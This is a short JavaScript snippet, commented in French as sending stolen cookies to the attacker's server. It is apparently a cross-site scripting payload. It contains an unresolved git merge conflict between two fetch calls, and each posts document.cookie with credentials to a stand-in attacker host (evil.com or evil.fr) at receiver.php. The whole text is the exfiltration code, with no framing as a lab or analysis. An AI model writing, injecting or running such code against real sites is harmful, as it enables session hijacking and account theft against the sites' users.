// Envoyer les cookies volés au serveur attaquant
<<<<<<< HEAD
fetch("https://evil.com:8443/receiver.php", {
=======
fetch("http://evil.fr:9999/receiver.php", {
>>>>>>> 443a9c5e512a28f7fa2adb804c0d10311550168b
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ cookies: document.cookie })
});